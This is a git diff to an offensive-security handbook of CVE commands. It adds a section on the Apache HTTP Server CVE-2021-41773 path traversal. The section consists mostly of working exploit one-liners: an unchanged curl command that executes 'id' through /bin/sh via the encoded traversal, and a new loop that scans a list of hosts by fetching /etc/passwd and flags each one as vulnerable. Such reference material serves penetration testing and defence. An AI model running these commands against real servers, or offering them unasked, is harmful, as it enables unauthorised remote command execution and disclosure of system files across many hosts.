@@ -4,6 +4,7 @@
 
 - [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Resources)
 - [Apache (CVE-2021-41773)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Apache-CVE-2021-41773)
+- [Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Path-Traversal-Zero-Day-in-Apache-HTTP-Server-CVE-2021-41773)
 - [Dirty Pipe (CVE-2022-0847)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Dirty-Pipe-CVE-2022-0847)
 - [Juicy Potato](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#juicy-potato)
 - [Log4j / Log4Shell (CVE-2021-44228)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Log4j--Log4Shell-CVE-2021-44228)
@@ -87,6 +88,12 @@
 
 ```c
 $ curl --data "echo;id" 'http://127.0.0.1:55026/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+```
+
+## Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)
+
+```c
+$ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
 ```
 
 ## Dirty Pipe (CVE-2022-0847)
